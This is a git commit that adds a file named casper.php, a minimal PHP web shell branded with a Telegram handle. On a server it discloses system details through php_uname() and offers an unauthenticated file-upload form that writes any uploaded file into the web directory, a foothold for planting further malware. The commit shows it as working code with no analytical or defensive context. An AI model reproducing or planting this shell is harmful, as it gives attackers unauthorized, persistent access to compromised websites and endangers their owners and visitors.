70f033305e6b9688cf3e6feaefd74331b342c1dc
BIBIL <99636054+spacebin-org@users.noreply.github.com>
2023-05-23 05:04:16 +0200

    Add files via upload

---
+++ casper.php
@@ -0,0 +1,2 @@
+
+<?php echo '<pre><p>T.ME/CASPERSECURITY   </p>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'OK';}else{echo 'ER';}}?>
